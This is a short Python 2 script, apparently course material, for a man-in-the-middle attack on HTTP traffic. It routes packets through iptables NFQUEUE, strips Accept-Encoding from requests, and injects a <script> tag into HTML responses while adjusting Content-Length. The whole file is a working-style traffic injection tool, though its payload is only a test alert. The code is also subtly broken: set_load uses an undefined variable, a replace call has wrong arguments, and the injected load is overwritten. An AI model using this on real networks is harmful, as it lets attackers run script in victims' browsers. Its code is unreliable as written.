#Python 2
#sudo iptables -I FORWARD -j NFQUEUE --queue-num 0 (OUTPUT and INPUT if using on local machine)
#sudo iptables --flush

import netfilterqueue
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return packet

def procces_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = "<script>alert('test');</script>"
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code ,"</body>")
            content_legth_search = re.search("(?:Content-Length:\s)(\d*)", scapy_packet[scapy.Raw].load)
            if content_legth_search and "text/html" in scapy_packet[scapy.Raw].load:
                content_length = content_legth_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                modified_load = scapy_packet[scapy.Raw].load.replace(content_length, str(new_content_length))
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, procces_packet)
queue.run()